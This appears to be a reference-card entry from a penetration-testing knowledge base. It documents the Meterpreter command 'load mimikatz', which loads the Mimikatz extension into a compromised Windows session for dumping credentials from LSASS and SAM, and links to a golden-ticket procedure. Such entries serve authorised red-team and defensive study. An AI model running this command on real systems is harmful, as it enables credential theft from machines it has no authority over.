---
type: command
executor: meterpreter
data: load mimikatz
output: null
platforms:
  - Windows
tags:
  - metasploit
  - mimikatz
verified: true
validated: true
---

# meterpreter-load-mimikatz

## Command

```meterpreter
load mimikatz
```

## Description

Loads the Mimikatz post-exploitation extension into the current Meterpreter session, enabling credential dumping capabilities from LSASS and SAM on Windows targets.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | No parameters; loads the extension directly | No |

## Examples

### Basic Usage

```meterpreter
load mimikatz
```

### Verification

Follow with [[commands/mimikatz-version]] to confirm loading.

## Expected Output

[*] Loaded extension 'mimikatz' (from C:\path\to\mimikatz.dll)

## Related

- [[procedures/Credential-Dumping-and-Golden-Ticket-Creation-with-Metasploit-and-Mimikatz]]
- [[tools/Metasploit-Framework]]
